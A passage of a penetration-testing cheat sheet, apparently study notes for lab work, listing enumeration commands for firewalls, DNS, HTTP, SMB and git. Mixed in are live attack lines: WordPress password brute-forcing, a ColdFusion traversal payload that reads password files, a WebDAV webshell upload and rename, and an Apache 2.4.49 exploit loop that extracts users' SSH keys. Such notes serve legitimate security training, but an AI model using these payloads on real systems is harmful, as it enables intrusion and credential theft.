</span><span id="__span-1-58"><a id="__codelineno-1-58" name="__codelineno-1-58" href="#__codelineno-1-58"></a><span class="sb">`</span>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">999</span><span class="w"> </span>unfiltered<span class="w"> </span>TCP<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>reset<span class="o">)</span><span class="sb">`</span>
</span><span id="__span-1-59"><a id="__codelineno-1-59" name="__codelineno-1-59" href="#__codelineno-1-59"></a>
</span><span id="__span-1-60"><a id="__codelineno-1-60" name="__codelineno-1-60" href="#__codelineno-1-60"></a>hping3<span class="w"> </span>-S<span class="w"> </span>-p<span class="w"> </span><span class="m">80</span><span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="w"> </span>&lt;target&gt;<span class="w">   </span><span class="c1"># SYN to port 80</span>
</span><span id="__span-1-61"><a id="__codelineno-1-61" name="__codelineno-1-61" href="#__codelineno-1-61"></a>hping3<span class="w"> </span>-S<span class="w"> </span>-p<span class="w"> </span><span class="m">81</span><span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="w"> </span>&lt;target&gt;<span class="w">   </span><span class="c1"># SYN to a random port</span>
</span><span id="__span-1-62"><a id="__codelineno-1-62" name="__codelineno-1-62" href="#__codelineno-1-62"></a><span class="c1"># RST response = port is closed, but host reachable</span>
</span><span id="__span-1-63"><a id="__codelineno-1-63" name="__codelineno-1-63" href="#__codelineno-1-63"></a><span class="c1"># No response = likely dropped silently (firewall)</span>
</span><span id="__span-1-64"><a id="__codelineno-1-64" name="__codelineno-1-64" href="#__codelineno-1-64"></a><span class="c1"># ICMP unreachable = network filter in place</span>
</span><span id="__span-1-65"><a id="__codelineno-1-65" name="__codelineno-1-65" href="#__codelineno-1-65"></a>nmap<span class="w"> </span>--script<span class="o">=</span>firewalk<span class="w"> </span>--traceroute<span class="w"> </span>-Pn<span class="w"> </span>-p<span class="w"> </span><span class="m">1</span>-100<span class="w"> </span>&lt;target&gt;<span class="w">  </span><span class="c1"># [Firwalk nse](https://nmap.org/nsedoc/scripts/firewalk.html)</span>
</span><span id="__span-1-66"><a id="__codelineno-1-66" name="__codelineno-1-66" href="#__codelineno-1-66"></a>
</span><span id="__span-1-67"><a id="__codelineno-1-67" name="__codelineno-1-67" href="#__codelineno-1-67"></a>
</span><span id="__span-1-68"><a id="__codelineno-1-68" name="__codelineno-1-68" href="#__codelineno-1-68"></a>
</span><span id="__span-1-69"><a id="__codelineno-1-69" name="__codelineno-1-69" href="#__codelineno-1-69"></a><span class="c1"># Port knocking</span>
</span><span id="__span-1-70"><a id="__codelineno-1-70" name="__codelineno-1-70" href="#__codelineno-1-70"></a>/etc/init.d/knockd<span class="w"> </span><span class="c1"># config</span>
</span><span id="__span-1-71"><a id="__codelineno-1-71" name="__codelineno-1-71" href="#__codelineno-1-71"></a>knock<span class="w"> </span>&lt;target-ip&gt;<span class="w"> </span><span class="m">571</span><span class="w"> </span><span class="m">290</span><span class="w"> </span><span class="m">911</span><span class="w">  </span><span class="c1"># port in seq</span>
</span><span id="__span-1-72"><a id="__codelineno-1-72" name="__codelineno-1-72" href="#__codelineno-1-72"></a><span class="k">for</span><span class="w"> </span>x<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">571</span><span class="w"> </span><span class="m">290</span><span class="w"> </span><span class="m">911</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>nmap<span class="w"> </span>-Pn<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">0</span><span class="w"> </span>-p<span class="w"> </span><span class="nv">$x</span><span class="w"> </span><span class="m">10</span>.10.10.43<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sleep<span class="w"> </span><span class="m">1</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
</span><span id="__span-1-73"><a id="__codelineno-1-73" name="__codelineno-1-73" href="#__codelineno-1-73"></a>
</span><span id="__span-1-74"><a id="__codelineno-1-74" name="__codelineno-1-74" href="#__codelineno-1-74"></a>
</span><span id="__span-1-75"><a id="__codelineno-1-75" name="__codelineno-1-75" href="#__codelineno-1-75"></a>
</span><span id="__span-1-76"><a id="__codelineno-1-76" name="__codelineno-1-76" href="#__codelineno-1-76"></a><span class="c1"># SQL Enumeration</span>
</span><span id="__span-1-77"><a id="__codelineno-1-77" name="__codelineno-1-77" href="#__codelineno-1-77"></a>mysql<span class="w"> </span>-u<span class="w"> </span>root<span class="w"> </span>-p<span class="s1">&#39;root&#39;</span><span class="w"> </span>-h<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span>-P<span class="w"> </span><span class="m">3306</span><span class="w"> </span>--skip-ssl
</span><span id="__span-1-78"><a id="__codelineno-1-78" name="__codelineno-1-78" href="#__codelineno-1-78"></a>impacket-mssqlclient<span class="w"> </span>Administrator:Lab123@192.168.50.18<span class="w"> </span>-windows-auth<span class="w"> </span><span class="c1"># windows-auth forces NTLM instead of kerberos</span>
</span><span id="__span-1-79"><a id="__codelineno-1-79" name="__codelineno-1-79" href="#__codelineno-1-79"></a>impacket-mssqlclient<span class="w"> </span>hostname.domain.com<span class="w"> </span>-k<span class="w"> </span>-port<span class="w"> </span>&lt;no&gt;
</span><span id="__span-1-80"><a id="__codelineno-1-80" name="__codelineno-1-80" href="#__codelineno-1-80"></a>
</span><span id="__span-1-81"><a id="__codelineno-1-81" name="__codelineno-1-81" href="#__codelineno-1-81"></a>
</span><span id="__span-1-82"><a id="__codelineno-1-82" name="__codelineno-1-82" href="#__codelineno-1-82"></a><span class="c1"># CMS</span>
</span><span id="__span-1-83"><a id="__codelineno-1-83" name="__codelineno-1-83" href="#__codelineno-1-83"></a>joomscan
</span><span id="__span-1-84"><a id="__codelineno-1-84" name="__codelineno-1-84" href="#__codelineno-1-84"></a>
</span><span id="__span-1-85"><a id="__codelineno-1-85" name="__codelineno-1-85" href="#__codelineno-1-85"></a><span class="c1"># Wordpress Scanning</span>
</span><span id="__span-1-86"><a id="__codelineno-1-86" name="__codelineno-1-86" href="#__codelineno-1-86"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://ip<span class="w"> </span>--disable-tls-checks<span class="w"> </span>--api-token<span class="w"> </span>&lt;redacted&gt;<span class="w"> </span><span class="c1"># WPVulnDB API from wpscan</span>
</span><span id="__span-1-87"><a id="__codelineno-1-87" name="__codelineno-1-87" href="#__codelineno-1-87"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://ip<span class="w"> </span>--disable-tls-checks<span class="w"> </span>--enumerate<span class="w"> </span>u<span class="w"> </span>--api-token<span class="w"> </span>&lt;redacted&gt;
</span><span id="__span-1-88"><a id="__codelineno-1-88" name="__codelineno-1-88" href="#__codelineno-1-88"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://offsecwp<span class="w"> </span>--enumerate<span class="w"> </span>ap<span class="w"> </span>--plugins-detection<span class="w"> </span>aggressive<span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>--api-token<span class="w"> </span>&lt;redacted&gt;
</span><span id="__span-1-89"><a id="__codelineno-1-89" name="__codelineno-1-89" href="#__codelineno-1-89"></a><span class="c1"># pass brute</span>
</span><span id="__span-1-90"><a id="__codelineno-1-90" name="__codelineno-1-90" href="#__codelineno-1-90"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://example.com/<span class="w"> </span>-e<span class="w"> </span>u<span class="w"> </span>--passwords<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</span><span id="__span-1-91"><a id="__codelineno-1-91" name="__codelineno-1-91" href="#__codelineno-1-91"></a>wpscan<span class="w"> </span>--url<span class="w"> </span>http://example.com/<span class="w"> </span>-U<span class="w"> </span>admin<span class="w"> </span>--passwords<span class="w"> </span>/usr/share/wordlists/rockyou.txt
</span><span id="__span-1-92"><a id="__codelineno-1-92" name="__codelineno-1-92" href="#__codelineno-1-92"></a>
</span><span id="__span-1-93"><a id="__codelineno-1-93" name="__codelineno-1-93" href="#__codelineno-1-93"></a><span class="c1"># Drupal</span>
</span><span id="__span-1-94"><a id="__codelineno-1-94" name="__codelineno-1-94" href="#__codelineno-1-94"></a>droopescan<span class="w"> </span>scan<span class="w"> </span>drupal<span class="w"> </span>-u<span class="w"> </span>http://example.org/<span class="w"> </span>-t<span class="w"> </span><span class="m">32</span>
</span><span id="__span-1-95"><a id="__codelineno-1-95" name="__codelineno-1-95" href="#__codelineno-1-95"></a><span class="c1"># find version &gt; /CHANGELOG.txt</span>
</span><span id="__span-1-96"><a id="__codelineno-1-96" name="__codelineno-1-96" href="#__codelineno-1-96"></a>
</span><span id="__span-1-97"><a id="__codelineno-1-97" name="__codelineno-1-97" href="#__codelineno-1-97"></a><span class="c1">### Adobe Cold Fusion</span>
</span><span id="__span-1-98"><a id="__codelineno-1-98" name="__codelineno-1-98" href="#__codelineno-1-98"></a><span class="c1"># check version /CFIDE/adminapi/base.cfc?wsdl</span>
</span><span id="__span-1-99"><a id="__codelineno-1-99" name="__codelineno-1-99" href="#__codelineno-1-99"></a><span class="c1"># fckeditor Version 8  LFI &gt; http://server/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en</span>
</span><span id="__span-1-100"><a id="__codelineno-1-100" name="__codelineno-1-100" href="#__codelineno-1-100"></a>
</span><span id="__span-1-101"><a id="__codelineno-1-101" name="__codelineno-1-101" href="#__codelineno-1-101"></a><span class="c1"># Vulnerability Scanning using NSE</span>
</span><span id="__span-1-102"><a id="__codelineno-1-102" name="__codelineno-1-102" href="#__codelineno-1-102"></a>ls<span class="w"> </span>-1<span class="w"> </span>/usr/share/nmap/scripts/&lt;servic&gt;*<span class="w"> </span><span class="c1"># scripts.db (for category check) https://nmap.org/nsedoc/scripts/</span>
</span><span id="__span-1-103"><a id="__codelineno-1-103" name="__codelineno-1-103" href="#__codelineno-1-103"></a>nmap<span class="w"> </span>--script-help<span class="w"> </span>http-headers
</span><span id="__span-1-104"><a id="__codelineno-1-104" name="__codelineno-1-104" href="#__codelineno-1-104"></a>
</span><span id="__span-1-105"><a id="__codelineno-1-105" name="__codelineno-1-105" href="#__codelineno-1-105"></a>grep<span class="w"> </span>&lt;category&gt;<span class="w"> </span>/usr/share/nmap/scripts/scripts.db
</span><span id="__span-1-106"><a id="__codelineno-1-106" name="__codelineno-1-106" href="#__codelineno-1-106"></a>nmap<span class="w"> </span>--script<span class="w"> </span>vulners<span class="w"> </span><span class="c1"># very bulky data for single serrvice</span>
</span><span id="__span-1-107"><a id="__codelineno-1-107" name="__codelineno-1-107" href="#__codelineno-1-107"></a>--script<span class="w"> </span><span class="s2">&quot;vuln&quot;</span><span class="w"> </span><span class="c1"># for vuln category</span>
</span><span id="__span-1-108"><a id="__codelineno-1-108" name="__codelineno-1-108" href="#__codelineno-1-108"></a><span class="c1"># we can download custom nse scripts, download and shift to nmap scripts folder then</span>
</span><span id="__span-1-109"><a id="__codelineno-1-109" name="__codelineno-1-109" href="#__codelineno-1-109"></a>sudo<span class="w"> </span>nmap<span class="w"> </span>--script-updatedb
</span><span id="__span-1-110"><a id="__codelineno-1-110" name="__codelineno-1-110" href="#__codelineno-1-110"></a>sudo<span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>exploitdb<span class="w"> </span><span class="c1"># to update the local copy of Exploit Database archive</span>
</span><span id="__span-1-111"><a id="__codelineno-1-111" name="__codelineno-1-111" href="#__codelineno-1-111"></a>searchsploit<span class="w"> </span>--id<span class="w"> </span>httpd
</span><span id="__span-1-112"><a id="__codelineno-1-112" name="__codelineno-1-112" href="#__codelineno-1-112"></a>searchsploit<span class="w"> </span>--id<span class="w"> </span>openssh<span class="w"> </span><span class="m">7</span>.2p2
</span><span id="__span-1-113"><a id="__codelineno-1-113" name="__codelineno-1-113" href="#__codelineno-1-113"></a><span class="c1"># some vulns to look for</span>
</span><span id="__span-1-114"><a id="__codelineno-1-114" name="__codelineno-1-114" href="#__codelineno-1-114"></a>nmap<span class="w"> </span>-sV<span class="w"> </span>--script<span class="w"> </span>http-shellshock
</span><span id="__span-1-115"><a id="__codelineno-1-115" name="__codelineno-1-115" href="#__codelineno-1-115"></a>
</span><span id="__span-1-116"><a id="__codelineno-1-116" name="__codelineno-1-116" href="#__codelineno-1-116"></a>
</span><span id="__span-1-117"><a id="__codelineno-1-117" name="__codelineno-1-117" href="#__codelineno-1-117"></a>
</span><span id="__span-1-118"><a id="__codelineno-1-118" name="__codelineno-1-118" href="#__codelineno-1-118"></a><span class="c1"># Git commands</span>
</span><span id="__span-1-119"><a id="__codelineno-1-119" name="__codelineno-1-119" href="#__codelineno-1-119"></a>git<span class="w"> </span>log
</span><span id="__span-1-120"><a id="__codelineno-1-120" name="__codelineno-1-120" href="#__codelineno-1-120"></a>git<span class="w"> </span>show
</span><span id="__span-1-121"><a id="__codelineno-1-121" name="__codelineno-1-121" href="#__codelineno-1-121"></a>
</span><span id="__span-1-122"><a id="__codelineno-1-122" name="__codelineno-1-122" href="#__codelineno-1-122"></a><span class="c1"># [gittools](https://github.com/internetwache/GitTools)</span>
</span><span id="__span-1-123"><a id="__codelineno-1-123" name="__codelineno-1-123" href="#__codelineno-1-123"></a>gitfinder
</span><span id="__span-1-124"><a id="__codelineno-1-124" name="__codelineno-1-124" href="#__codelineno-1-124"></a>git-dumper<span class="w"> </span>http://ip/.git/<span class="w"> </span>destdir
</span><span id="__span-1-125"><a id="__codelineno-1-125" name="__codelineno-1-125" href="#__codelineno-1-125"></a>gitextractor<span class="w"> </span>gitdir<span class="w"> </span>outdir
</span><span id="__span-1-126"><a id="__codelineno-1-126" name="__codelineno-1-126" href="#__codelineno-1-126"></a>
</span><span id="__span-1-127"><a id="__codelineno-1-127" name="__codelineno-1-127" href="#__codelineno-1-127"></a>git<span class="w"> </span>log
</span><span id="__span-1-128"><a id="__codelineno-1-128" name="__codelineno-1-128" href="#__codelineno-1-128"></a>git<span class="w"> </span>branch
</span><span id="__span-1-129"><a id="__codelineno-1-129" name="__codelineno-1-129" href="#__codelineno-1-129"></a>git<span class="w"> </span>branch<span class="w"> </span>-a
</span><span id="__span-1-130"><a id="__codelineno-1-130" name="__codelineno-1-130" href="#__codelineno-1-130"></a>git<span class="w"> </span>config<span class="w"> </span>list
</span><span id="__span-1-131"><a id="__codelineno-1-131" name="__codelineno-1-131" href="#__codelineno-1-131"></a>git<span class="w"> </span>status
</span><span id="__span-1-132"><a id="__codelineno-1-132" name="__codelineno-1-132" href="#__codelineno-1-132"></a>git<span class="w"> </span>restore<span class="w"> </span>--staged<span class="w"> </span>README.md<span class="w"> </span><span class="c1"># in order to restory file from staged</span>
</span><span id="__span-1-133"><a id="__codelineno-1-133" name="__codelineno-1-133" href="#__codelineno-1-133"></a>git<span class="w"> </span>diff<span class="w"> </span>previous_commit_hash<span class="w"> </span>new_commit_hash
</span><span id="__span-1-134"><a id="__codelineno-1-134" name="__codelineno-1-134" href="#__codelineno-1-134"></a>git<span class="w"> </span>clone<span class="w"> </span>file:///filepath
</span><span id="__span-1-135"><a id="__codelineno-1-135" name="__codelineno-1-135" href="#__codelineno-1-135"></a>
</span><span id="__span-1-136"><a id="__codelineno-1-136" name="__codelineno-1-136" href="#__codelineno-1-136"></a><span class="c1"># to clone repository inside our kali machine from the victim machine</span>
</span><span id="__span-1-137"><a id="__codelineno-1-137" name="__codelineno-1-137" href="#__codelineno-1-137"></a><span class="nv">GIT_SSH_COMMAND</span><span class="o">=</span><span class="s1">&#39;ssh -i id_rsa -p 22&#39;</span><span class="w"> </span>git<span class="w"> </span>clone<span class="w"> </span>git@victim_ip:/git-server
</span><span id="__span-1-138"><a id="__codelineno-1-138" name="__codelineno-1-138" href="#__codelineno-1-138"></a>
</span><span id="__span-1-139"><a id="__codelineno-1-139" name="__codelineno-1-139" href="#__codelineno-1-139"></a>.git/logs/HEAD<span class="w">  </span><span class="c1"># to research logs manually</span>
</span></code></pre></div>
<h3 id="service-enumeration">Service Enumeration</h3>
<h4 id="dns">DNS</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># DNS Enumeration</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>host<span class="w"> </span>-t<span class="w"> </span>&lt;recordtype&gt;<span class="w"> </span>hostname.com<span class="w"> </span><span class="c1"># recordtype = mx, cname, a, txt</span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>host<span class="w"> </span>-a<span class="w"> </span>hostname.com
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>hostname<span class="w"> </span>-t<span class="w"> </span>NS<span class="w"> </span>hostname.com
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>host<span class="w"> </span>-l<span class="w"> </span>domain.con<span class="w"> </span>dnsserver<span class="w"> </span><span class="c1"># to do zone transfer</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>nslookup<span class="w"> </span>hostname<span class="w"> </span><span class="m">8</span>.8.8.8
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>dig<span class="w"> </span>@&lt;serverip&gt;<span class="w"> </span>hostname<span class="w"> </span>ANY<span class="w"> </span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a>dig<span class="w"> </span>axfr<span class="w"> </span>@namserver<span class="w"> </span>megacorpone.com<span class="w"> </span><span class="c1"># zone transfer</span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>dnsrecon<span class="w"> </span>-d<span class="w"> </span>example.com<span class="w"> </span>-t<span class="w"> </span>std
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>dnsrecon<span class="w"> </span>-d<span class="w"> </span>example.com<span class="w"> </span>-D<span class="w"> </span>~/wordlist.txt<span class="w"> </span>-t<span class="w"> </span>brt
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>dnsenum<span class="w"> </span>offseclab.io<span class="w"> </span>--threads<span class="w"> </span><span class="m">100</span>
</span></code></pre></div>
<h4 id="https">HTTP(S)</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1"># WEB DAV</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>davtest<span class="w"> </span>--url<span class="w"> </span>http://x.x.x.x
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="c1"># to interact with webdav server</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>cadaver<span class="w"> </span>http://&lt;IP&gt;/&lt;webdavpath&gt;
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>dav&gt;<span class="w"> </span>put<span class="w"> </span>/usr/share/webshells/asp/webshell.asp
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="c1"># or manually</span>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="c1"># let&#39;s suppose only html file is allowed in webdav using PUT method</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>curl<span class="w"> </span>-X<span class="w"> </span>PUT<span class="w"> </span>http://10.10.10.15/test.html<span class="w"> </span>-d<span class="w"> </span>@test.html
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="c1"># we can PUT and then use MOVE method to rename the file extension to aspx, php or any exe to get revshell</span>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>curl<span class="w"> </span>-X<span class="w"> </span>MOVE<span class="w"> </span>--header<span class="w"> </span><span class="s1">&#39;Destination:http://10.10.10.15/test.aspx&#39;</span><span class="w"> </span><span class="s1">&#39;http://10.10.10.15/test.html&#39;</span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="c1"># to verify</span>
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a>curl<span class="w"> </span>http://10.10.10.15/test.aspx
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>nikto<span class="w"> </span>http://website.com
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="c1"># to list http headers only</span>
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a>curl<span class="w"> </span>-I<span class="w"> </span>http://website.com
</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a>
</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a>openssl<span class="w"> </span>s_client<span class="w"> </span>-connect<span class="w"> </span><span class="nv">$ip</span>:443
</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>
</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a>
</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="c1"># apache http 2.4.49 exploit</span>
</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">{</span><span class="s1">&#39;user2&#39;</span>,<span class="s1">&#39;user1&#39;</span>,<span class="s1">&#39;user2&#39;</span>,<span class="s1">&#39;user3&#39;</span><span class="o">}</span><span class="p">;</span><span class="k">do</span><span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;extracting </span><span class="nv">$i</span><span class="s2">&quot;</span><span class="p">;</span><span class="w"> </span>./apache2.4.49.sh<span class="w"> </span>webtargets.txt<span class="w"> </span><span class="s2">&quot;/home/</span><span class="nv">$i</span><span class="s2">/.ssh/id_ecdsa&quot;</span><span class="p">;</span><span class="w"> </span><span class="k">done</span>
</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a><span class="c1"># check every id file</span>
</span></code></pre></div>
<h4 id="smb">SMB</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1"># SMB &amp; netbios enumeration</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>sudo<span class="w"> </span>nbtscan<span class="w"> </span>-r<span class="w"> </span><span class="m">192</span>.168.50.0/24<span class="w">  </span><span class="c1"># it enumerates netbios name service runs on 137</span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">445</span><span class="w"> </span>--script<span class="w"> </span>smb*<span class="w"> </span>&lt;target&gt;
</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>enum4linux<span class="w"> </span>-a<span class="w"> </span>&lt;target&gt;
</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>enum4linux<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;domain/user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-a<span class="w"> </span>&lt;target&gt;
</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a>smbclient<span class="w"> </span>-L<span class="w"> </span>//&lt;target&gt;<span class="w"> </span>-N
</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>smbclient<span class="w"> </span>-L<span class="w"> </span>//&lt;target&gt;<span class="w"> </span>-U<span class="w"> </span>&lt;username&gt;%&lt;password&gt;
</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>smbclient<span class="w"> </span>//&lt;target&gt;/&lt;sharename&gt;<span class="w"> </span>-U<span class="w"> </span>&lt;username&gt;
</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>smbmap<span class="w"> </span>-H<span class="w"> </span>&lt;target&gt;<span class="w"> </span>-u<span class="w"> </span>&lt;user&gt;<span class="w"> </span>-p<span class="w"> </span>&lt;pass&gt;<span class="w"> </span>-R
</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>
</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="k">for</span><span class="w"> </span>ip<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">$(</span>cat<span class="w"> </span>smbhosts.txt<span class="k">)</span><span class="p">;</span><span class="k">do</span><span class="w"> </span>enum4linux<span class="w"> </span>-U<span class="w"> </span><span class="nv">$ip</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>enum4.out<span class="p">;</span><span class="k">done</span>
</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>
</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>smbclient<span class="w"> </span>&gt;<span class="w"> </span>prompt<span class="w"> </span>off
</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>smbclient<span class="w"> </span>&gt;<span class="w"> </span>recurse<span class="w"> </span>on
</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>smbclient<span class="w"> </span>&gt;<span class="w"> </span>mget<span class="w"> </span>*
</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a>
</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;iprange&gt;<span class="w">  </span><span class="c1"># only search for windows machine</span>
</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ipraneg&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares<span class="w"> </span><span class="c1"># to look for null session</span>
</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;iprange&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;guest&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>--shares
</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>
</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>nxc<span class="w"> </span>smb<span class="w"> </span>&lt;ip&gt;<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;user&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-M<span class="w"> </span>spider_plus<span class="w"> </span>-o<span class="w"> </span><span class="nv">DOWNLOAD_FLAG</span><span class="o">=</span>True<span class="w"> </span><span class="c1"># to download all the file from smb shares</span>
